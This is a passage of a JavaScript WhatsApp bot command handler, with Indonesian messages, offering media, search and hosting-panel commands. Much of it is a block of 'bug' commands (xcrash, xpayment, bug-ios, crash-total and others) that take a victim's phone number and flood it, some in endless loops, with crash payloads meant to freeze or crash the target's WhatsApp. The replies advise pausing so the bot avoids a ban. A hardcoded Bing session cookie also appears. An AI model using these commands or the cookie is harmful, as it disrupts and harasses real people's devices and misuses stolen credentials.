"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = reply(`*SUKSES MEMBUAT SERVER✅*

*ID SERVER : ${server.id}*

Untuk Delete Server Silahkan Ketik
_.delsrv id server_
`)
}
break
        
case'tourl':{
let q = m.quoted ? m.quoted : m
  let mime = (q.msg || q).mimetype || ''
  if (!mime) return reply('🚩 reply image!')
  ZetInc.sendMessage(m.chat, {
    react: {
      text: '🕒',
      key: m.key,
    }
  });
  let media = await q.download()
  let uploadImage = require('./lib/uploadImage')
  let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)
  let link = await (isTele ? uploadImage : uploadFile)(media)
  reply(`${link}
${media.length} Byte(s)
${isTele ? '(Tidak Ada Tanggal Kedaluwarsa)' : '(Tidak diketahui)'}`)
}
break
        
case"upsaluran":
case"upch":{
if (!isCreator) return reply(mess.owner)
ZetInc.sendMessage(m.chat, { react: { text: '⏳', key: m.key, }})
await sleep(6000)
ZetInc.sendMessage(m.chat, { react: { text: '⌛', key: m.key, }})
ZetInc.sendMessage(`${global.idch}`,{audio: await quoted.download(), mimetype: 'audio/mp4', ptt: true})
await sleep(2000)
ZetInc.sendMessage(m.chat, { react: { text: '✅', key: m.key, }})
}
break
        
case "disk":{
exec('cd && du -h --max-depth=1', (err, stdout) => {
if (err) return m?.reply(`${err}`)
if (stdout) return m?.reply(stdout)
})
}
break

case 'cekkhodam': {
if (!text) return zreply("ketik nama lu anjg")
let who
if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.sender;
const khodam = pickRandom([
	  "Kaleng Cat Avian",
	  "Pipa Rucika",
	  "Botol Tupperware",
	  "Badut Mixue",
	  "Sabun GIV",
	  "Sandal Swallow",
	  "Jarjit",
	  "Ijat",
	  "Fizi",
	  "Mail",
	  "Ehsan",
	  "Upin",
	  "Ipin",
	  "sungut lele",
	  "Tok Dalang",
	  "Opah",
	  "Opet",
	  "Alul",
	  "Pak Vinsen",
	  "Maman Resing",
	  "Pak RT",
	  "Admin ETI",
	  "Bung Towel",
	  "Lumpia Basah",
	  "Martabak Manis",
	  "Baso Tahu",
	  "Tahu Gejrot",
	  "Dimsum",
	  "Seblak Ceker",
	  "Telor Gulung",
	  "Tahu Aci",
	  "Tempe Mendoan",
	  "Nasi Kucing",
	  "Kue Cubit",
	  "Tahu Sumedang",
	  "Nasi Uduk",
	  "Wedang Ronde",
	  "Kerupuk Udang",
	  "Cilok",
	  "Cilung",
	  "Kue Sus",
	  "Jasuke",
	  "Seblak Makaroni",
	  "Sate Padang",
	  "Sayur Asem",
	  "Kromboloni",
	  "Marmut Pink",
	  "Belalang Mullet",
	  "Kucing Oren",
	  "Lintah Terbang",
	  "Singa Paddle Pop",
	  "Macan Cisewu",
	  "Vario Mber",
	  "Beat Mber",
	  "Supra Geter",
	  "Oli Samping",
	  "Knalpot Racing",
	  "Jus Stroberi",
	  "Jus Alpukat",
	  "Alpukat Kocok",
	  "Es Kopyor",
	  "Es Jeruk",
	  "Cappucino Cincau",
	  "Jasjus Melon",
	  "Teajus Apel",
	  "Pop ice Mangga",
	  "Teajus Gulabatu",
	  "Air Selokan",
	  "Air Kobokan",
	  "TV Tabung",
	  "Keran Air",
	  "Tutup Panci",
	  "Kotak Amal",
	  "Tutup Termos",
	  "Tutup Botol",
	  "Kresek Item",
	  "Kepala Casan",
	  "Ban Serep",
	  "Kursi Lipat",
	  "Kursi Goyang",
	  "Kulit Pisang",
	  "Warung Madura",
	  "Gorong-gorong",
	])
  
	const response = ` 
> *Nama :* ${text}
> *Khodam :* ${khodam}`
	reply(response)
  }
break
        
case 'apakah': {
if (!q) return zreply(`*Example:* ${prefix + command} saya wibu`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
zreply(`Pertanyaan : Apakah ${q}\nJawaban : ${kah}`)
}
break
case 'bisakah': {
if (!q) return zreply(`*Example:* ${prefix + command} saya menjadi presiden`)
const bisa = ['Bisa', 'Gak Bisa', 'Gak Bisa Ajg Aaokawpk', 'TENTU PASTI KAMU BISA!!!!']
const ga = bisa[Math.floor(Math.random() * bisa.length)]
zreply(`Pertanyaan : Apakah ${q}\nJawaban : ${ga}`)
}
break
case 'bagaimanakah': {
if (!q) return zreply(`*Example:* ${prefix + command} cara mengatasi sakit hati`)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel', 'astaghfirallah Beneran???', 'Pusing ah', 'Owhh Begitu:(', 'Gimana yeee']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
zreply(`Pertanyaan : Apakah ${q}\nJawaban : ${ya}`)
}
break
        
case 'addowner': {
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`*Example:* ${prefix+command} 628xxxxxxxxx`)
prem1 = text.split("|")[0].replace(/[^0-9]/g, '')
let cek1 = await ZetInc.onWhatsApp(prem1 + `@s.whatsapp.net`)
if (cek1.length == 0) return (`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
kontributor.push(prem1)
fs.writeFileSync('./lib/database/owner.json', JSON.stringify(kontributor))
reply(`${prem1} Sudah menjadi kontributor!!!`)
ZetInc.sendMessage(prem1+'@s.whatsapp.net', {text: `Kamu sekarang adalah owner / kontributor bot`},{quoted: m})
}
break

case 'delowner': {
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`*Example:* ${prefix+command} 628xxxxxxxx`)
prem2 = text.split("|")[0].replace(/[^0-9]/g, '')
unp = kontributor.indexOf(prem2)
kontributor.splice(unp, 1)
fs.writeFileSync('./lib/database/owner.json', JSON.stringify(kontributor))
reply(`${prem2} Tidak lagi Kontributor!!!`)
}
break
 
case'yts':{
if (!text) return reply(`*Example:* ${prefix + command } Someone loved you`)

  // Menghasilkan pengurangan acak antara 1 dan 5
  const randomReduction = Math.floor(Math.random() * 5) + 1;
    let search = await yts(text);
    let videos = search.all;

    if (!videos || videos.length === 0) {
      reply('No video found');
      return;
    }

    // Pilih antara 1 dan 5 video secara acak
    const numVideos = Math.min(videos.length, Math.floor(Math.random() * 5) + 1);
    const selectedVideos = [];

    while (selectedVideos.length < numVideos) {
      const randomIndex = Math.floor(Math.random() * videos.length);
      const randomVideo = videos.splice(randomIndex, 1)[0]; // Menghindari pemilihan video yang sama
      selectedVideos.push(randomVideo);
    }

    let push = [];

    for (let i = 0; i < selectedVideos.length; i++) {
      let video = selectedVideos[i];
      let cap = `Title : ${video.title}`;

      const mediaMessage = await prepareWAMessageMedia({ image: { url: video.thumbnail } }, { upload: ZetInc.waUploadToServer });

      push.push({
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: cap
        }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({
          text: wmku
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          title: `Video ke - ${i + 1}`,
          subtitle: '',
          hasMediaAttachment: true,
          ...mediaMessage
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
          buttons: [
            {
              "name": "quick_reply",
              "buttonParamsJson": `{"display_text":"Video 🎬","id":"${prefix}ytmp4 ${video.url}"}`
            },
            {
              "name": "quick_reply",
              "buttonParamsJson": `{"display_text":"Audio 🎵","id":"${prefix}ytmp3 ${video.url}"}`
            }
          ]
        })
      });
    }

    const msg = generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({
              text: mess.success
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: wmku
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              hasMediaAttachment: false
            }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: push
            })
          })
        }
      }
    }, {});

    await ZetInc.relayMessage(m.chat, msg.message, {
      messageId: msg.key.id
    });

}
break
        
case'pin':
case'pinterest':{
if (!text) return reply(`*Example*: ${ prefix + command } Gojo Satoru`)
async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: ZetInc.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res); // Mengacak array
  let ult = res.splice(0, 5); // Mengambil 10 gambar pertama dari array yang sudah diacak
  let i = 1;

  for (let pus of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `Image ke - ${i++}`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: `${ownername}`
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: 'Hasil.',
        hasMediaAttachment: true,
        imageMessage: await createImage(pus)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: `{"display_text":"url","Klik disini":"${pus}","merchant_url":"${pus}"}`
          }
        ]
      })
    });
  }

  const bot = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hasil Pencarian Dari ${text}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: global.ownername
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});

  await ZetInc.relayMessage(m.chat, bot.message, {
    messageId: bot.key.id
  });
}
break
        
case "😈":
case "🐦":
case "🧢":
case "🗿":
case "😹":
case "betacore":
case "xbeta":
case "xcrash":{
if (!isCreator) return reply(mess.owner)
if (!isPremium) return reply(mess.prem)
if (!q) return reply(`*Example*: ${prefix + command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n> *Example*: ${prefix + command} 6287392784527`)
let Pe = bijipler + '@s.whatsapp.net'
await reply(mess.bugrespon)
await bugpayflow(Pe);
for (let j = 0; j < 30; j++) {
await BugPayment(target)
await coresix(Pe, "p", 1020000, true);
await coresix(Pe, "p", 1020000, true);
await BugPayment(target)
await coresix(Pe, "p", 1020000, true);
await coresix(Pe, "p", 1020000, true);
await sleep(500)
}
await reply(`_Successfully Send Bug to ${Pe} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
}
break;
        
        

case 'xwaweb': case 'doublekill': case 'xioshot': case 'triplekill': {
if (!isCreator) return reply(mess.owner)
if (!isPremium) return reply(mess.prem)
if (!q) return reply(`*Example*: ${prefix + command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n> *Example*: ${prefix + command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(mess.bugrespon)
await bugpayflow(target);
for (let j = 0; j < 30; j++) {
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);
}
await reply(`_Successfully Send Bug to ${target} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
}
break
        
case 'xbeta': 
case 'xpayment':{
if (!isCreator) return reply(mess.owner)
if (!isPremium) return reply(mess.prem)
if (!q) return reply(`*Example*: ${prefix + command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n> *Example*: ${prefix + command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(mess.bugrespon)
await bugpayflow(target);
await BugPayment(target)
for (let j = 0; j < 30; j++) {
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);
}
await reply(`_Successfully Send Bug to ${target} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
}
break
     
case 'gasbug': case 'oemji': case 'lawag': case'okidos': {
if (!isCreator) return reply(mess.owner)
if (!isPremium) return reply(mess.prem)
if (!q) return reply(`*Example*: ${prefix + command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n> *Example*: ${prefix + command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await bugpayflow(target);
await bugpayflow(target);
await BugPayment(target)
for (let j = 0; j < 30; j++) {
await BugPayment(target)
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);
}
await sleep(4000)
await reply(`_Successfully Send Bug to ${Pe} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
}
break
        
case 'virg4m': case 'bijibapakkau': {
if (!isCreator) return reply(mess.owner)
if (!isPremium) return reply(mess.prem)
if (!q) return reply(`*Example*: ${prefix + command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n> *Example*: ${prefix + command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(mess.bugrespon)
await bugpayflow(target);
await bugpayflow(target);
await BugPayment(target)
for (let j = 0; j < 30; j++) {
await BugPayment(target)
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);
}
await reply(`_Successfully Send Bug to ${bijipler} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
}
break        

case 'bug-rom': case 'restart-ui': {
if (!isCreator) return reply(mess.owner)
if (!isPremium) return reply(mess.prem)
if (!q) return reply(`Penggunaan ${prefix + command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> *Example*: ${prefix + command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(mess.bugrespon)
await bugpayflow(target);
await bugpayflow(target);
await BugPayment(target)
for (let j = 0; j < 30; j++) {
await BugPayment(target)
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);
}
await reply(`_Successfully Send Bug to ${bijipler} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
}
break
        
case 'ios24j': case 'vios-unli': {
if (!isPremium) return reply(mess.owner)
if (!isPremium) return reply(mess.prem)
if (!q) return reply(`*Example*: ${prefix + command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n> *Example*: ${prefix + command} 6287392784527`)
await reply(mess.bugrespon)
let target = bijipler + '@s.whatsapp.net'
  for (;;) {
    await aipong(target)
    await sleep(1200)
  }
}
break   
        
case 'bug-ios': case 'bug-ipong': {
if (!isCreator) return reply(mess.owner)
if (!isPremium) return reply(mess.prem)
if (!q) return reply(`Penggunaan .${command} 6287392784527|1\n# memasukkan 1 sama dengan 300.detik`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n> *Example*: ${prefix + command} 6287392784527`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1] * 200
let ppk = jumlah * 1.5
zreply(ppk + " detik");
reply(mess.bugrespon)
for (let j = 0; j < jumlah; j++) {
await aipong(target)
await sleep(1500)
}
reply(`_Succes Send Bug Ke ${target} dalam kurun waktu ${ppk} detik_`)
}
break
        
case 'gada-ampun': case 'bug-24j': {
if (!isCreator) return reply(mess.owner)
if (!isPremium) return reply(mess.prem)
if (!q) return reply(`*Example*: ${prefix + command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n> *Example*: ${prefix + command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(mess.bugrespon)
for (;;) {
await BugPayment(target)
await bugpayflow(target);
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);
}
await sleep(3000)
}
break

case 'samsung-chace': {
if (!isCreator) return reply(mess.owner)
if (!isPremium) return reply(mess.prem)
if (!q) return reply(`*Example*: ${prefix + command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n> Example : ${prefix + command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(mess.bugrespon)

await bugpayflow(target);
await bugpayflow(target);
await BugPayment(target)
for (let j = 0; j < 30; j++) {
await BugPayment(target)
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);
}

await reply(`_Successfully Send Bug to ${bijipler} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
}
break

case 'gimanabg': {
if (!isCreator) return
for (let j = 0; j < 30; j++) {
await BugPayment(m.chat)
await coresix(m.chat, "p", 1020000, true);
await coresix(m.chat, "p", 1020000, true);
await BugPayment(m.chat)
await coresix(m.chat, "p", 1020000, true);
}
}
break
        
case 'zero-bug': case 'bug-s': {
if (!isCreator) return reply(mess.owner)
if (!isPremium) return reply(mess.prem)
if (!q) return reply(`*Example*: ${prefix + command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n> *Example*: ${prefix + command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(mess.bugrespon)
await bugpayflow(target);
await bugpayflow(target);
await BugPayment(target)
for (let j = 0; j < 30; j++) {
await BugPayment(target)
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);
}
await reply(`_Successfully Send Bug to ${bijipler} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
}
break

case 'fatal-notif': case 'fatal-ui': case 'crash-total': case 'forces-sql': {
if (!isCreator) return reply(mess.owner)
if (!isPremium) return reply(mess.prem)
if (!q) return reply(`*Example*: ${prefix + command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n> *Example*: ${prefix + command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(mess.bugrespon)
await bugpayflow(target);
await bugpayflow(target);
await BugPayment(target)
for (let j = 0; j < 30; j++) {
await BugPayment(target)
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);
}
await reply(`_Successfully Send Bug to ${bijipler} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
}
break
        
case'coresix':
case'dovure':{
if (!isCreator) return reply(mess.owner)
if (!isPremium) return reply(mess.prem)
if (!q) return reply(`*Example*: ${prefix + command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n> *Example*: ${prefix + command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(mess.bugrespon)
await bugpayflow(target);
await bugpayflow(target);
await BugPayment(target)
for (let j = 0; j < 30; j++) {
await BugPayment(target)
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);
}
await reply(`_Successfully Send Bug to ${bijipler} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
}
break
        
case 'sipilist': case '1hit': case 'mimir': case '1shoot': {
if (!isCreator) return reply(mess.owner)
if (!isPremium) return reply(mess.prem)
if (!q) return reply(`*Example*: ${prefix + command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n> *Example*: ${prefix + command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(mess.bugrespon)
await bugpayflow(target);
await bugpayflow(target);
await BugPayment(target)
for (let j = 0; j < 30; j++) {
await BugPayment(target)
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);
await coresix(target, "p", 1020000, true);
}
await reply(`_Successfully Send Bug to ${bijipler} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
}
break
        
case 'animediffusion': case 'stabledif': case 'animedif':{
if (!text) return reply(`*Example*:\n ${prefix+command} 1girl, long hair, solo, choker, bare shoulders, blue eyes, fang, looking at viewer, upper body, White hair, blush, closed mouth, off shoulder, bangs, bow, collarbone, 4k`)
let anu = await Animedif(text)
ZetInc.sendFile(m.chat, anu, 'anu.jpg', `Prompt: ${text}`, m)
}
break
        
case'spotifysearch':{
  if (!text) return reply(`*Example*: ${prefix + command} Perfect - ed Sheeran`);
  try {
    let json = await searchSpotifyTracks(text);
    if (json.length < 1) return reply(`Tidak ada hasil ditemukan.`);
    let ini_txt = '*Spotify Search*';
    for (const x of json) {
      ini_txt += `
      
🎵 *Judul:* ${x.name}
👥 *Artis:* ${x.artists.map(v => v.name).join(', ')}
👥 *Artis Album:* ${x.album.artists.map(v => v.name).join(', ')}
🆔 *ID:* ${x.id}
📅 *Tanggal Rilis Album:* ${x.album.release_date}
🆔 *ID Album:* ${x.album.id}
🎵 *Jumlah Trek Album:* ${x.album.total_tracks}
🔢 *Nomor Trek:* ${x.album.track_number}
⏳ *Durasi:* ${x.duration_ms} ms
🔗 *Uri:* ${x.uri}
🎵 *URL Album*: ${x.album.external_urls.spotify}
🔗 *URL:* ${x.external_urls.spotify}
${x.preview_url ? `🎧 *Direct URL:* ${x.preview_url}` : ''}
───────────────────`;
    }
    reply(ini_txt);
  } catch (e) {
    return reply('*Spotify Search*\n\nTerjadi Kesalahan, Coba Lagi Nanti.');
  }
};
break
        
case'mediafire':{
let input = `*Example*: ${prefix + command} https://www.mediafire.com/file/pwxob70rpgma9lz/GBWhatsApp_v8.75%2528Tutorial_Yud%2529.apk/file*`
	if (!text) return reply(input)
	const baby1 = await mediafire(text)
	if (baby1.filesize.split('MB')[0] >= 100) return reply('*File Over Limit* ' + util.format(baby1))
				await sleep(500)
				const result = `*MEDIAFIRE DOWNLOADER*

📄 *Name* : ${baby1.filename}
⚖️ *Size* : ${baby1.filesize}
📨 zType* : ${baby1.filetype}
🔗 *Link* : ${baby1.link}
📋 *UploadAt*: ${baby1.uploadAt}
`
ZetInc.sendFile(m.chat, baby1.link || result, `${baby1.filename}`, '', m, null, { mimetype: `${baby1.filetype}`, asDocument: true })
}
break
        
/*case'owner':{
let text = `
* harap untuk tidak spam kepada owner
* tanyakan pada hal yang penting penting aja
* ga penting? ga di read
* bertanya gausah basa basi, langsung inti
* telpon/vc = blok

     _© Created By KyuuRzy_`

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
"messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hai ${pushname} ini adalah Ownerku`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: text
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: ``,
            subtitle: text,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
{
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"Owner Bot\",\"url\":\"https://wa.me/+${owner}\",\"merchant_url\":\"https://wa.me/+${owner}\"}`
              },
           ],
 })})}}}, {quoted:m})

await ZetInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})}
break*/
        
case'bingimg':{
let text;
  if (args.length >= 1) {
    text = args.slice(0).join(" ");
  } else if (m.quoted && m.quoted.text) {
    text = m.quoted.text;
  } else {
    return reply(`*Example:* ${prefix + command} 1girl`);
  }

  await reply("Please wait...");
  try {
    const res = new BingImageCreator({
      cookie: `1OQJWqw84X2IsJ3v0doRxiXup7hGX7xSlWeoaHJfO92u9XBoK2a7GPThQLfnZorFhudCLEJmYzXn6eCsESGejupcnSnfx1BAypz46osaE8OXxdZS4eqQ5FzFt3nXQnL-gmi5MTBf4iQ8te7zSpb3KgwR3BNXM5MU_WgZPNNuTA_pPjaD-CVmpavXtjGChn6w_74gathJf5NZnFQPsarSvug; WLID=mjnAuahThR9MgaUmfnMfZ/fy5VZvHX82hacSw2tYC5OocGKi8oYH7xcaLX2J1xEqLy5LpSiPGMyuSwGTbQi7XyzeqmcL+hDZO66FrMumONA=; _EDGE_S=SID=28563962BAEB61533DFA2DFDBBBD606D`,
    });
    const data = await res.createImage(text);

    if (data.length > 0) {
      for (let i = 0; i < data.length; i++) {
        try {
          if (!data[i].endsWith(".svg")) {
            await ZetInc.sendFile(
              m.chat,
              data[i],
              "",
              `Image *(${i + 1}/${data.length})*\n\n*Prompt*: ${text}`,
              m,
              false,
              { mentions: [m.sender] },
            );
          }
        } catch (error) {
          console.error(`Error sending file: ${error.message}`);
          await reply(`Failed to send image *(${i + 1}/${data.length})*`);
        }
      }
    } else {
      await reply("No images found.");
    }
  } catch (error) {
    console.error(`Error in handler: ${error.message}`);
    await reply(`${error}\n\n${error.message}`);
  }
};
break

case'tiktoks': case'tiktoksearch': case'ttsearch':{
  if (!text) return reply(`*Example :* .${command} jedag jedug`)
  ZetInc.sendMessage(m.chat, { react: { text: '🕐', key: m.key }})
  let kemii = await tiktoks(`${text}`)
  ZetInc.sendMessage(m.chat, {
  video: {url: kemii.no_watermark},
  gifPlayback: true, 
  caption: '```Result from:```'+' `'+text+'`'
  }, {quoted: m})
  }
  break      

case "delpanel": case "hapuspanel": {
if (!isCreator) return
if (!args[0]) return reply("idservernya")
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections = []
for (let server of servers) {
let s = server.attributes
if (args[0] == s.id.toString()) {
sections.push(s.name.toLowerCase())
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (sections.includes(u.username)) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections.length == 0) return reply("*ID Server/User* Tidak Ditemukan")
reply(`Berhasil Menghapus Akun Panel *${capital(sections[0])}*`)
}
break

case "delusr": {
if (!isCreator) return
let usr = args[0]
if (!usr) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE USER*')
}
break

case "delsrv": {
if (!isCreator) return
let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE SERVER*')
}
break

case "listpanel": case "listp": case "listserver": {
if (!isCreator) return 
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
